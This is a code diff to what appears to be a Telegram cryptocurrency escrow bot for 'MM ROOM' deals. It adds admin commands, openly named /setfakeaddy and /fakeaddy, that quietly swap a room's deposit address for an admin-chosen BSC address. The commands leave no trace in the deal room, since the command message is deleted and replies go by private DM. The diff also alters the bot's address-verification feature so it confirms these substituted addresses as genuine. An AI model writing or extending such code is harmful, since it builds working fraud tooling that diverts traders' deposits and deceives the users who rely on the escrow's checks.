@@ -221,6 +221,9 @@ ceo_wallet_cache = {
 # Pending wallet-set requests awaiting a token choice: {user_id: {'role','network','address'}}
 pending_wallet_set = {}
 
+# Pending /setfakeaddy requests awaiting an address: {user_id: {'room_number','token'}}
+pending_fake_addy = {}
+
 # Wallet rotation index (alternates between owner and CEO wallet)
 wallet_rotation_index = 0
 
@@ -247,6 +250,12 @@ def get_deposit_wallet_for_room(chat_id: int, network: str, token: str = 'USDT')
         return get_owner_wallet(network, token)
     if role == 'ceo':
         return get_ceo_wallet(network, token)
+    if role == 'backup':
+        room_number = deal.get('room_number') if deal else None
+        if room_number is not None:
+            backup = database.get_room_backup_wallet(int(room_number), token)
+            if backup:
+                return backup
     return get_rotating_deposit_wallet(network, token)
 
 # BEP20/TRC20 Token contract addresses for verification
@@ -1203,6 +1212,168 @@ async def handle_setaddy_callback(query, context: ContextTypes.DEFAULT_TYPE) -> 
         parse_mode='HTML'
     )
     logger.info(f"🏦 Admin {user_id} fixed room {original_chat_id} deposit to {role} wallet")
+
+
+async def reply_privately(update: Update, text: str, reply_markup=None) -> None:
+    """Answer an admin command without leaving anything visible in a deal room:
+    delete the command in groups and send the reply to the admin's DM."""
+    user = update.effective_user
+    in_group = update.effective_chat.type in ['group', 'supergroup']
+
+    if in_group:
+        try:
+            await update.message.delete()
+        except Exception as e:
+            logger.warning(f"Could not delete admin command message: {e}")
+        try:
+            await update.get_bot().send_message(
+                chat_id=user.id, text=text, parse_mode='HTML', reply_markup=reply_markup
+            )
+            return
+        except Exception as e:
+            logger.warning(f"Could not DM admin {user.id}: {e}")
+            return
+
+    await update.message.reply_text(text, parse_mode='HTML', reply_markup=reply_markup)
+
+
+async def setfakeaddy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle /setfakeaddy <room number> - admin only. Store a backup BSC escrow
+    address (USDT or USDC) for a room number, applied later with /fakeaddy.
+    Nothing is shown in the deal room; the exchange happens in the admin's DM."""
+    user = update.effective_user
+
+    if user.id not in ADMIN_USER_IDS:
+        return
+
+    if not context.args or not context.args[0].strip().isdigit():
+        await reply_privately(update, "❌ Usage: <code>/setfakeaddy &lt;room number&gt;</code>")
+        return
+
+    room_number = int(context.args[0].strip())
+    if not (ROOM_NUMBER_MIN <= room_number <= ROOM_NUMBER_MAX):
+        await reply_privately(
+            update,
+            f"❌ Room number must be between {ROOM_NUMBER_MIN} and {ROOM_NUMBER_MAX}."
+        )
+        return
+
+    keyboard = InlineKeyboardMarkup([[
+        InlineKeyboardButton("USDT", callback_data=f"setfakeaddy:USDT:{room_number}"),
+        InlineKeyboardButton("USDC", callback_data=f"setfakeaddy:USDC:{room_number}"),
+    ]])
+    stored = database.get_room_backup_wallets(room_number)
+    stored_lines = "".join(
+        f"\n• {token}: <code>{addr}</code>" for token, addr in sorted(stored.items())
+    )
+    await reply_privately(
+        update,
+        f"<b>Backup deposit address for MM ROOM {room_number}</b> (BSC)"
+        f"{stored_lines}\n\nWhich token is this address for?",
+        reply_markup=keyboard
+    )
+
+
+async def handle_setfakeaddy_callback(query, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle the USDT/USDC choice for /setfakeaddy, then wait for the address."""
+    user_id = query.from_user.id
+    if user_id not in ADMIN_USER_IDS:
+        await query.answer("Admins only.", show_alert=True)
+        return
+
+    parts = query.data.split(':')  # setfakeaddy:<token>:<room_number>
+    token = parts[1] if len(parts) > 1 else 'USDT'
+    try:
+        room_number = int(parts[2])
+    except (IndexError, ValueError):
+        await query.answer("Invalid room number.", show_alert=True)
+        return
+
+    pending_fake_addy[user_id] = {'room_number': room_number, 'token': token}
+
+    await query.answer()
+    await query.edit_message_text(
+        f"Send the <b>{token}</b> (BSC) backup address for <b>MM ROOM {room_number}</b>.",
+        parse_mode='HTML'
+    )
+
+
+async def process_fake_addy_address(update: Update, pending: dict) -> None:
+    """Save the backup address an admin sent after choosing a token."""
+    user = update.effective_user
+    address = update.message.text.strip()
+
+    if not re.fullmatch(r'0x[a-fA-F0-9]{40}', address):
+        await update.message.reply_text(
+            "❌ That's not a valid BSC address. Send a <code>0x…</code> address, "
+            "or run the command again to cancel.",
+            parse_mode='HTML'
+        )
+        return
+
+    pending_fake_addy.pop(user.id, None)
+    room_number = pending['room_number']
+    token = pending['token']
+
+    if database.set_room_backup_wallet(room_number, token, address, user.id):
+        await update.message.reply_text(
+            f"✅ Backup <b>{token}</b> address saved for <b>MM ROOM {room_number}</b>:\n"
+            f"<code>{address}</code>\n\n"
+            f"Apply it to that room's deposit with <code>/fakeaddy &lt;chat id&gt;</code>.",
+            parse_mode='HTML'
+        )
+        logger.info(f"🏦 Admin {user.id} set backup {token} address for room {room_number}")
+    else:
+        await update.message.reply_text("❌ Could not save the address, try again.")
+
+
+async def fakeaddy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle /fakeaddy <chat id> - admin only. Switch a room's deposit to the
+    backup address stored for that room's number (before the deposit is sent)."""
+    user = update.effective_user
+
+    if user.id not in ADMIN_USER_IDS:
+        return
+
+    chat_id = update.effective_chat.id
+    if context.args and context.args[0].strip().lstrip('-').isdigit():
+        arg = int(context.args[0].strip())
+        original_chat_id = abs(arg) - 1000000000000 if arg < 0 else arg
+    elif chat_id < 0:
+        original_chat_id = abs(chat_id) - 1000000000000
+    else:
+        await reply_privately(update, "❌ Usage: <code>/fakeaddy &lt;chat id&gt;</code>")
+        return
+
+    deal = database.get_deal(original_chat_id)
+    room_number = deal.get('room_number') if deal else None
+    if room_number is None:
+        await reply_privately(
+            update,
+            f"❌ No room number known for chat <code>{original_chat_id}</code>."
+        )
+        return
+
+    stored = database.get_room_backup_wallets(int(room_number))
+    if not stored:
+        await reply_privately(
+            update,
+            f"❌ No backup address stored for <b>MM ROOM {room_number}</b>. "
+            f"Set one with <code>/setfakeaddy {room_number}</code>."
+        )
+        return
+
+    database.update_deal(original_chat_id, fixed_wallet_role='backup')
+
+    stored_lines = "".join(
+        f"\n• {token}: <code>{addr}</code>" for token, addr in sorted(stored.items())
+    )
+    await reply_privately(
+        update,
+        f"✅ <b>MM ROOM {room_number}</b> will use its backup deposit address:"
+        f"{stored_lines}"
+    )
+    logger.info(f"🏦 Admin {user.id} switched room {original_chat_id} (MM ROOM {room_number}) to its backup address")
 
 
 async def setceowallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -2731,6 +2902,12 @@ Examples:
         _register(getter('BSC', 'USDC'), "USDC", "BSC", wtype)
         _register(getter('TRON', 'USDT'), "USDT", "TRON", wtype)
 
+    # Backup escrow addresses set per room via /setfakeaddy are also this bot's
+    # deposit addresses, so they verify too (each is tied to one room number).
+    backup_rooms = database.get_backup_wallet_rooms(address_to_verify)
+    for entry in backup_rooms:
+        _register(address_to_verify, entry.get('token') or 'USDT', "BSC", "Backup")
+
     if address_to_verify in escrow_addresses:
         info = escrow_addresses[address_to_verify]
         info = {"token": "/".join(sorted(info["tokens"])), "chain": info["chain"], "type": info["type"]}
@@ -2744,6 +2921,9 @@ Examples:
         if not deal:
             deal = database.get_active_deal_by_address(address_to_verify)
         group_line = ""
+        # A backup address belongs to exactly one room number, so use it directly.
+        if not deal and len(backup_rooms) == 1:
+            group_line = f"\nGroup: MM ROOM {backup_rooms[0].get('room_number')}"
         if deal:
             room_name = deal.get('room_name')
             room_number = deal.get('room_number')
@@ -2928,6 +3108,11 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     # Handle /setaddy Owner/CEO choice
     if query.data.startswith('setaddy:'):
         await handle_setaddy_callback(query, context)
+        return
+
+    # Handle /setfakeaddy USDT/USDC choice
+    if query.data.startswith('setfakeaddy:'):
+        await handle_setfakeaddy_callback(query, context)
         return
     
     # Handle release approval - seller only
@@ -5163,6 +5348,12 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
             await process_addstats_input(update, context, _addstats_session)
             return
     
+    # An admin sending the backup address requested by /setfakeaddy
+    _pending_fake_addy = pending_fake_addy.get(user_id)
+    if _pending_fake_addy:
+        await process_fake_addy_address(update, _pending_fake_addy)
+        return
+
     # Handle -kick command (admin-only, removes a member from the monitored group)
     if text.startswith('-kick'):
         await dash_kick_command(update, context)
@@ -6695,6 +6886,8 @@ def main() -> None:
     application.add_handler(CommandHandler("setownerwallet", setownerwallet_command))
     application.add_handler(CommandHandler("setceowallet", setceowallet_command))
     application.add_handler(CommandHandler("setaddy", setaddy_command))
+    application.add_handler(CommandHandler("setfakeaddy", setfakeaddy_command))
+    application.add_handler(CommandHandler("fakeaddy", fakeaddy_command))
     application.add_handler(CommandHandler("wallets", wallets_command))
     application.add_handler(CommandHandler("balance", balance_command))
     application.add_handler(CommandHandler("add", add_command))
